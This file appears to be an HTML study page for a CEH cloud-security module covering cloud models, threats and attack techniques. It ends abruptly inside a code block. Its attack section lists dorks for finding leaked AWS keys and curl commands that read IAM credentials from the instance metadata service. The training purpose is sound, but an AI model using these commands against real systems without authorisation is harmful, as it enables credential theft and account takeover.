@@ -1,0 +1,2481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v13 Module 19: Cloud Computing</title>
+    <style>
+        :root {
+            --primary-color: #2C3E50;
+            --secondary-color: #3498DB;
+            --accent-color: #E74C3C;
+            --success-color: #27AE60;
+            --warning-color: #F39C12;
+            --danger-color: #E74C3C;
+            --dark-color: #1A1A1A;
+            --light-color: #ECF0F1;
+            --gradient-primary: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-success: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            --gradient-warning: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-danger: linear-gradient(135deg, #fc466b 0%, #3f5efb 100%);
+            --shadow: 0 10px 30px rgba(0,0,0,0.1);
+            --shadow-hover: 0 15px 40px rgba(0,0,0,0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark-color);
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: var(--gradient-primary);
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: var(--shadow);
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .progress-container {
+            background: rgba(255, 255, 255, 0.2);
+            height: 8px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0 10px 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--success-color);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 4px;
+        }
+
+        #progressText {
+            font-size: 0.9em;
+            margin-top: 5px;
+            opacity: 0.9;
+        }
+
+        .navigation {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .nav-btn {
+            background: white;
+            color: var(--primary-color);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            min-width: 140px;
+            text-align: center;
+        }
+
+        .nav-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-hover);
+            background: var(--secondary-color);
+            color: white;
+        }
+
+        .nav-btn.active {
+            background: var(--secondary-color);
+            color: white;
+            box-shadow: var(--shadow-hover);
+        }
+
+        .content-area {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: var(--shadow);
+            margin-bottom: 30px;
+            min-height: 600px;
+        }
+
+        .module-section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .module-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            color: var(--primary-color);
+            font-size: 2.2em;
+            margin-bottom: 25px;
+            border-bottom: 3px solid var(--secondary-color);
+            padding-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .card {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-hover);
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .card h4 {
+            color: var(--secondary-color);
+            font-size: 1.2em;
+            margin: 15px 0 10px 0;
+            font-weight: 600;
+        }
+
+        .highlight-box {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        .warning-box {
+            background: var(--gradient-warning);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        .danger-box {
+            background: var(--gradient-danger);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+            font-size: 1em;
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+        }
+
+        .btn-success {
+            background: var(--gradient-success);
+            color: white;
+        }
+
+        .btn-warning {
+            background: var(--gradient-warning);
+            color: white;
+        }
+
+        .btn-danger {
+            background: var(--gradient-danger);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-hover);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .quiz-container {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 5px solid var(--secondary-color);
+        }
+
+        .question {
+            font-weight: 600;
+            margin-bottom: 15px;
+            font-size: 1.1em;
+            color: var(--primary-color);
+        }
+
+        .option {
+            background: white;
+            margin: 10px 0;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .option:hover {
+            background: var(--light-color);
+            border-color: var(--secondary-color);
+        }
+
+        .option.selected {
+            background: var(--secondary-color);
+            color: white;
+            border-color: var(--secondary-color);
+        }
+
+        .option.correct {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .option.incorrect {
+            background: var(--danger-color);
+            color: white;
+        }
+
+        .explanation {
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            border-left: 4px solid var(--success-color);
+        }
+
+        .quiz-results {
+            background: var(--gradient-success);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            margin: 15px 0;
+            overflow-x: auto;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .attack-vector {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
+            color: #333;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-weight: 500;
+        }
+
+        .tool-card {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .tool-card h4 {
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        ul, ol {
+            margin: 15px 0;
+            padding-left: 25px;
+        }
+
+        li {
+            margin: 8px 0;
+            line-height: 1.6;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background-color: white;
+            margin: 5% auto;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: var(--shadow);
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            right: 20px;
+            top: 15px;
+        }
+
+        .close:hover {
+            color: var(--danger-color);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .content-area {
+                padding: 20px;
+            }
+            
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .navigation {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .nav-btn {
+                width: 200px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--secondary-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-color);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .stat-card {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .stat-number {
+            font-size: 2em;
+            display: block;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>☁️ CEH v13 Module 19</h1>
+            <p>Cloud Computing Security & Ethical Hacking</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p id="progressText">Progress: 0% Complete</p>
+            <div style="margin-top: 15px; font-size: 0.9em; opacity: 0.8;">
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    ← → Navigate Sections
+                </span>
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    Esc Close Modal
+                </span>
+            </div>
+        </div>
+
+        <div class="navigation">
+            <button class="nav-btn active" onclick="showSection('overview')">📋 Overview</button>
+            <button class="nav-btn" onclick="showSection('fundamentals')">☁️ Cloud Fundamentals</button>
+            <button class="nav-btn" onclick="showSection('service-models')">🏗️ Service Models</button>
+            <button class="nav-btn" onclick="showSection('security-threats')">⚠️ Security Threats</button>
+            <button class="nav-btn" onclick="showSection('attack-techniques')">🎯 Attack Techniques</button>
+            <button class="nav-btn" onclick="showSection('aws-hacking')">🚀 AWS Hacking</button>
+            <button class="nav-btn" onclick="showSection('azure-hacking')">🔷 Azure Hacking</button>
+            <button class="nav-btn" onclick="showSection('container-security')">🐳 Container Security</button>
+            <button class="nav-btn" onclick="showSection('countermeasures')">🛡️ Countermeasures</button>
+            <button class="nav-btn" onclick="showSection('tools')">🔧 Tools</button>
+            <button class="nav-btn" onclick="showSection('quiz')">📝 Assessment</button>
+            <button class="nav-btn" onclick="showSection('certification')">🏆 Certification</button>
+        </div>
+
+        <div class="content-area">
+            <!-- Overview Section -->
+            <div id="overview" class="module-section active">
+                <h2 class="section-title">🎯 Module 19 Overview</h2>
+                
+                <div class="card">
+                    <h3>☁️ Cloud Computing Security: The New Frontier</h3>
+                    <p>Welcome to CEH v13 Module 19! This comprehensive module explores the security challenges and attack vectors in modern cloud computing environments. As organizations increasingly migrate to cloud platforms, understanding cloud security has become critical for ethical hackers and security professionals.</p>
+                    
+                    <h4>🎯 What You'll Master:</h4>
+                    <ul>
+                        <li><strong>Cloud Computing Fundamentals:</strong> IaaS, PaaS, SaaS, and deployment models</li>
+                        <li><strong>Major Cloud Platforms:</strong> AWS, Microsoft Azure, and Google Cloud Platform</li>
+                        <li><strong>Cloud-Specific Threats:</strong> Data breaches, account hijacking, and insider threats</li>
+                        <li><strong>AWS Attack Techniques:</strong> S3 bucket enumeration, IAM privilege escalation</li>
+                        <li><strong>Azure AD Reconnaissance:</strong> User enumeration and authentication bypass</li>
+                        <li><strong>Container Security:</strong> Docker, Kubernetes vulnerabilities and exploits</li>
+                        <li><strong>Cloud Security Tools:</strong> AADInternals, AWS CLI, cloud enumeration tools</li>
+                        <li><strong>Defense Strategies:</strong> Cloud security controls and monitoring</li>
+                    </ul>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <span class="stat-number">85%</span>
+                        Organizations using cloud services
+                    </div>
+                    <div class="stat-card">
+                        <span class="stat-number">36%</span>
+                        Misconfigured S3 buckets publicly readable
+                    </div>
+                    <div class="stat-card">
+                        <span class="stat-number">80%</span>
+                        Cloud breaches due to misconfigurations
+                    </div>
+                    <div class="stat-card">
+                        <span class="stat-number">3hrs</span>
+                        Average time to exploit cloud vulnerabilities
+                    </div>
+                </div>
+
+                <div class="highlight-box">
+                    <h4>🆕 New in CEH v13:</h4>
+                    <p><strong>Enhanced Cloud Security Focus:</strong> Updated content covering latest cloud attack vectors, container security vulnerabilities, and advanced cloud reconnaissance techniques. Includes hands-on exercises with real cloud environments and the latest attack tools.</p>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Learning Path & Time Investment</h3>
+                    <p>This module provides <strong>3+ hours</strong> of comprehensive content:</p>
+                    <div class="grid">
+                        <div style="background: var(--gradient-primary); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>Foundation (45 min)</h4>
+                            <p>Cloud fundamentals, service models, and deployment types</p>
+                        </div>
+                        <div style="background: var(--gradient-warning); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>Threats & Attacks (90 min)</h4>
+                            <p>Security threats, attack techniques, and exploitation methods</p>
+                        </div>
+                        <div style="background: var(--gradient-success); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>Practical Application (60 min)</h4>
+                            <p>Tools, countermeasures, and assessment exercises</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn btn-success" onclick="showSection('fundamentals')">Start Learning! →</button>
+            </div>
+
+            <!-- Cloud Fundamentals Section -->
+            <div id="fundamentals" class="module-section">
+                <h2 class="section-title">☁️ Cloud Computing Fundamentals</h2>
+
+                <div class="card">
+                    <h3>🌐 What is Cloud Computing?</h3>
+                    <p>Cloud computing is a model for enabling ubiquitous, convenient, on-demand network access to a shared pool of configurable computing resources that can be rapidly provisioned and released with minimal management effort.</p>
+                    
+                    <div class="highlight-box">
+                        <h4>NIST Definition - Five Essential Characteristics:</h4>
+                        <ul>
+                            <li><strong>On-demand self-service:</strong> Users can provision resources automatically</li>
+                            <li><strong>Broad network access:</strong> Services available over the network</li>
+                            <li><strong>Resource pooling:</strong> Multi-tenant model with location independence</li>
+                            <li><strong>Rapid elasticity:</strong> Capabilities can scale rapidly</li>
+                            <li><strong>Measured service:</strong> Pay-per-use billing model</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🏗️ Cloud Deployment Models</h3>
+                    <div class="grid">
+                        <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🌍 Public Cloud</h4>
+                            <p><strong>Examples:</strong> AWS, Azure, GCP</p>
+                            <p>Resources owned by cloud provider, shared infrastructure, cost-effective but less control</p>
+                        </div>
+                        <div style="background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🏢 Private Cloud</h4>
+                            <p><strong>Examples:</strong> VMware, OpenStack</p>
+                            <p>Dedicated infrastructure, enhanced security and control, higher cost</p>
+                        </div>
+                        <div style="background: linear-gradient(135deg, #11998e, #38ef7d); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🔗 Hybrid Cloud</h4>
+                            <p><strong>Examples:</strong> AWS Outposts, Azure Arc</p>
+                            <p>Combination of public and private, data/app portability</p>
+                        </div>
+                        <div style="background: linear-gradient(135deg, #fc466b, #3f5efb); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>👥 Community Cloud</h4>
+                            <p><strong>Examples:</strong> Government clouds</p>
+                            <p>Shared by organizations with common concerns</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Key Cloud Actors (NIST Framework)</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="background: #e8f5e8; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #27AE60;">
+                            <strong>☁️ Cloud Consumer:</strong> Person/organization using cloud services
+                        </li>
+                        <li style="background: #e8f4fd; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #3498DB;">
+                            <strong>🏢 Cloud Provider:</strong> Entity making cloud services available
+                        </li>
+                        <li style="background: #fff3e0; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #F39C12;">
+                            <strong>🔍 Cloud Auditor:</strong> Independent assessor of cloud services
+                        </li>
+                        <li style="background: #fde8e8; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #E74C3C;">
+                            <strong>🤝 Cloud Broker:</strong> Manages use, performance, delivery of services
+                        </li>
+                        <li style="background: #f3e5f5; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #9B59B6;">
+                            <strong>🚚 Cloud Carrier:</strong> Provides connectivity and transport
+                        </li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('service-models')">Next: Service Models →</button>
+            </div>
+
+            <!-- Service Models Section -->
+            <div id="service-models" class="module-section">
+                <h2 class="section-title">🏗️ Cloud Service Models</h2>
+
+                <div class="card">
+                    <h3>📊 The Cloud Stack</h3>
+                    <p>Understanding the three primary cloud service models is crucial for identifying attack surfaces and security responsibilities.</p>
+                </div>
+
+                <div class="grid">
+                    <div class="card" style="background: var(--gradient-primary); color: white;">
+                        <h3>🖥️ Infrastructure as a Service (IaaS)</h3>
+                        <h4>What You Get:</h4>
+                        <ul>
+                            <li>Virtual machines and compute resources</li>
+                            <li>Storage and networking infrastructure</li>
+                            <li>Operating system control</li>
+                            <li>Full administrative access</li>
+                        </ul>
+                        <h4>Examples:</h4>
+                        <p><strong>AWS EC2, Azure Virtual Machines, Google Compute Engine</strong></p>
+                        <h4>Security Responsibility:</h4>
+                        <p>Customer manages: OS, applications, data, runtime, middleware</p>
+                    </div>
+
+                    <div class="card" style="background: var(--gradient-success); color: white;">
+                        <h3>⚙️ Platform as a Service (PaaS)</h3>
+                        <h4>What You Get:</h4>
+                        <ul>
+                            <li>Development and deployment platform</li>
+                            <li>Runtime environments</li>
+                            <li>Database management systems</li>
+                            <li>Web servers and development tools</li>
+                        </ul>
+                        <h4>Examples:</h4>
+                        <p><strong>AWS Elastic Beanstalk, Azure App Service, Google App Engine</strong></p>
+                        <h4>Security Responsibility:</h4>
+                        <p>Customer manages: Applications and data only</p>
+                    </div>
+
+                    <div class="card" style="background: var(--gradient-warning); color: white;">
+                        <h3>💼 Software as a Service (SaaS)</h3>
+                        <h4>What You Get:</h4>
+                        <ul>
+                            <li>Complete applications</li>
+                            <li>User interfaces</li>
+                            <li>Multi-tenant architecture</li>
+                            <li>Subscription-based access</li>
+                        </ul>
+                        <h4>Examples:</h4>
+                        <p><strong>Microsoft 365, Salesforce, Google Workspace</strong></p>
+                        <h4>Security Responsibility:</h4>
+                        <p>Customer manages: User accounts, data, and access controls</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Specialized Service Models</h3>
+                    <div class="grid">
+                        <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🆔 Identity as a Service (IDaaS)</h4>
+                            <p><strong>Examples:</strong> Azure AD, Okta, Auth0</p>
+                            <p>Cloud-based identity and access management</p>
+                        </div>
+                        <div style="background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🛡️ Security as a Service (SECaaS)</h4>
+                            <p><strong>Examples:</strong> CloudFlare, Palo Alto Prisma</p>
+                            <p>Cloud-delivered security services</p>
+                        </div>
+                        <div style="background: linear-gradient(135deg, #11998e, #38ef7d); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🐳 Container as a Service (CaaS)</h4>
+                            <p><strong>Examples:</strong> AWS ECS, Azure Container Instances</p>
+                            <p>Container orchestration and management</p>
+                        </div>
+                        <div style="background: linear-gradient(135deg, #fc466b, #3f5efb); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>⚡ Function as a Service (FaaS)</h4>
+                            <p><strong>Examples:</strong> AWS Lambda, Azure Functions</p>
+                            <p>Serverless computing platform</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚠️ Shared Responsibility Model</h4>
+                    <p><strong>Critical Security Concept:</strong> Cloud security is a shared responsibility between the cloud provider and the customer. The provider secures the infrastructure, while customers secure their data, applications, and access controls. Misunderstanding this model is a leading cause of cloud security breaches.</p>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('security-threats')">Next: Security Threats →</button>
+            </div>
+
+            <!-- Security Threats Section -->
+            <div id="security-threats" class="module-section">
+                <h2 class="section-title">⚠️ Cloud Security Threats</h2>
+
+                <div class="card">
+                    <h3>🎯 OWASP Cloud Security Top 10</h3>
+                    <p>The OWASP Cloud Security Project identifies the most critical security risks in cloud environments:</p>
+
+                    <div style="display: grid; grid-template-columns: 1fr; gap: 15px; margin: 20px 0;">
+                        <div class="attack-vector">
+                            <strong>1. 🔐 Insufficient Identity, Credential, and Access Management</strong>
+                            <p>Weak authentication, poor credential management, inadequate access controls</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>2. 🔓 Insecure Interfaces and APIs</strong>
+                            <p>Vulnerable REST APIs, weak authentication mechanisms, inadequate encryption</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>3. ⚙️ System and Application Vulnerabilities</strong>
+                            <p>Unpatched systems, vulnerable applications, weak configurations</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>4. 🎛️ Insufficient Due Diligence</strong>
+                            <p>Poor vendor assessment, inadequate security requirements</p>
+                        </div>
+                        <div class="attack-vector">
+                            <strong>5. 📊 Data Loss and Data Leakage</strong>
+                            <p>Inadequate data protection, poor backup strategies, data exposure</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🌊 Major Cloud Security Threats</h3>
+                    
+                    <div class="grid">
+                        <div class="danger-box">
+                            <h4>🔓 Data Breaches</h4>
+                            <ul>
+                                <li>Misconfigured storage buckets (S3, Azure Blob)</li>
+                                <li>Inadequate access controls</li>
+                                <li>Weak encryption implementations</li>
+                                <li>Exposed databases and APIs</li>
+                            </ul>
+                        </div>
+
+                        <div class="warning-box">
+                            <h4>👤 Account Hijacking</h4>
+                            <ul>
+                                <li>Credential stuffing attacks</li>
+                                <li>Phishing and social engineering</li>
+                                <li>Weak password policies</li>
+                                <li>MFA bypass techniques</li>
+                            </ul>
+                        </div>
+
+                        <div class="danger-box">
+                            <h4>🕵️ Malicious Insiders</h4>
+                            <ul>
+                                <li>Privileged user abuse</li>
+                                <li>Data exfiltration</li>
+                                <li>Sabotage activities</li>
+                                <li>Unauthorized access to systems</li>
+                            </ul>
+                        </div>
+
+                        <div class="warning-box">
+                            <h4>⚙️ Insecure APIs</h4>
+                            <ul>
+                                <li>Authentication bypass</li>
+                                <li>Injection vulnerabilities</li>
+                                <li>Rate limiting issues</li>
+                                <li>Data exposure through APIs</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎭 Shadow IT and Resource Abuse</h3>
+                    <div class="highlight-box">
+                        <h4>Shadow IT Risks:</h4>
+                        <p><strong>Definition:</strong> IT systems or solutions developed without proper approval or oversight</p>
+                        <ul>
+                            <li>Unmanaged cloud resources and accounts</li>
+                            <li>Unsanctioned SaaS applications</li>
+                            <li>Personal cloud storage usage</li>
+                            <li>Unauthorized application deployments</li>
+                        </ul>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>Cloud Resource Abuse:</h4>
+                        <ul>
+                            <li><strong>Cryptomining:</strong> Unauthorized cryptocurrency mining</li>
+                            <li><strong>DDoS Platforms:</strong> Using cloud resources for attacks</li>
+                            <li><strong>Spam Operations:</strong> Email spam and phishing campaigns</li>
+                            <li><strong>Data Storage:</strong> Illegal content hosting</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🌐 Multi-Tenancy Risks</h3>
+                    <p>Cloud environments often share resources among multiple customers (tenants), creating unique security challenges:</p>
+                    
+                    <ul>
+                        <li><strong>🔄 Cross-tenant data leakage:</strong> Data bleeding between tenants</li>
+                        <li><strong>🏃‍♂️ VM escape:</strong> Breaking out of virtual machine isolation</li>
+                        <li><strong>📊 Side-channel attacks:</strong> Extracting information through shared resources</li>
+                        <li><strong>🔍 Metadata exposure:</strong> Cloud metadata services revealing sensitive information</li>
+                        <li><strong>🌐 Network isolation failures:</strong> Inadequate network segmentation</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('attack-techniques')">Next: Attack Techniques →</button>
+            </div>
+
+            <!-- Attack Techniques Section -->
+            <div id="attack-techniques" class="module-section">
+                <h2 class="section-title">🎯 Cloud Attack Techniques</h2>
+
+                <div class="card">
+                    <h3>🔍 Cloud Reconnaissance Methodology</h3>
+                    <p>Systematic information gathering is the foundation of cloud security assessment:</p>
+                    
+                    <div class="grid">
+                        <div style="background: var(--gradient-primary); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>1️⃣ Target Identification</h4>
+                            <ul>
+                                <li>DNS enumeration for cloud services</li>
+                                <li>SSL certificate analysis</li>
+                                <li>OSINT gathering from social media</li>
+                                <li>Company website analysis</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-success); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>2️⃣ Service Discovery</h4>
+                            <ul>
+                                <li>Cloud provider identification</li>
+                                <li>Service enumeration (S3, Azure Blob)</li>
+                                <li>Public cloud resource scanning</li>
+                                <li>API endpoint discovery</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-warning); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>3️⃣ Vulnerability Assessment</h4>
+                            <ul>
+                                <li>Misconfiguration detection</li>
+                                <li>Access control testing</li>
+                                <li>Encryption validation</li>
+                                <li>Compliance gap analysis</li>
+                            </ul>
+                        </div>
+
+                        <div style="background: var(--gradient-danger); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>4️⃣ Exploitation</h4>
+                            <ul>
+                                <li>Privilege escalation</li>
+                                <li>Data exfiltration</li>
+                                <li>Lateral movement</li>
+                                <li>Persistence mechanisms</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 OSINT Techniques for Cloud Resources</h3>
+                    
+                    <h4>Google Dorking for Cloud Assets:</h4>
+                    <div class="code-block">
+site:*.amazonaws.com "company-name"
+site:*.blob.core.windows.net "target-org"
+site:*.storage.googleapis.com inurl:company
+filetype:json site:github.com "aws_access_key_id"
+intitle:"index of" site:s3.amazonaws.com</div>
+
+                    <h4>🔍 Search Engine Reconnaissance:</h4>
+                    <ul>
+                        <li><strong>Shodan:</strong> "Server: AmazonS3" + organization name</li>
+                        <li><strong>Censys:</strong> SSL certificate analysis for cloud services</li>
+                        <li><strong>GrayHatWarfare:</strong> Open S3 bucket enumeration</li>
+                        <li><strong>OSINT.sh:</strong> Automated cloud asset discovery</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🌐 DNS and Subdomain Enumeration</h3>
+                    <p>Cloud services often use predictable naming conventions, making them discoverable through DNS enumeration:</p>
+                    
+                    <div class="code-block"># Common cloud service patterns
+company-name.s3.amazonaws.com
+company-name-backup.blob.core.windows.net
+company-staging.azurewebsites.net
+company-prod.herokuapp.com
+company.storage.googleapis.com</div>
+
+                    <h4>Automated Enumeration Tools:</h4>
+                    <ul>
+                        <li><strong>cloud_enum:</strong> Multi-cloud enumeration tool</li>
+                        <li><strong>CloudMapper:</strong> AWS account reconnaissance</li>
+                        <li><strong>Azurite:</strong> Azure resource enumeration</li>
+                        <li><strong>GCP-IAM-Privilege-Escalation:</strong> GCP service discovery</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🔐 Credential Harvesting Techniques</h3>
+                    
+                    <div class="warning-box">
+                        <h4>⚠️ Common Credential Exposure Points:</h4>
+                        <ul>
+                            <li><strong>GitHub Repositories:</strong> Hardcoded API keys and access keys</li>
+                            <li><strong>Public S3 Buckets:</strong> Configuration files with credentials</li>
+                            <li><strong>Docker Images:</strong> Environment variables and config files</li>
+                            <li><strong>CI/CD Systems:</strong> Build logs and environment variables</li>
+                            <li><strong>Code Repositories:</strong> .env files and configuration files</li>
+                        </ul>
+                    </div>
+
+                    <h4>Automated Credential Scanning:</h4>
+                    <div class="code-block"># GitHub Dorks for AWS credentials
+"aws_access_key_id" site:github.com
+"aws_secret_access_key" site:github.com
+"AKIAI" site:github.com
+"AKIA" filetype:json
+
+# Trufflehog for credential scanning
+trufflehog git https://github.com/target/repo</div>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Metadata Service Exploitation</h3>
+                    <p>Cloud metadata services provide instance information and can be exploited to retrieve credentials:</p>
+                    
+                    <h4>AWS Instance Metadata Service (IMDS):</h4>
+                    <div class="code-block"># IMDS v1 (vulnerable to SSRF)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# IMDS v2 (requires token)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/</div>
+
+                    <h4>Azure Instance Metadata Service:</h4>
+                    <div class="code-block"># Azure metadata endpoint
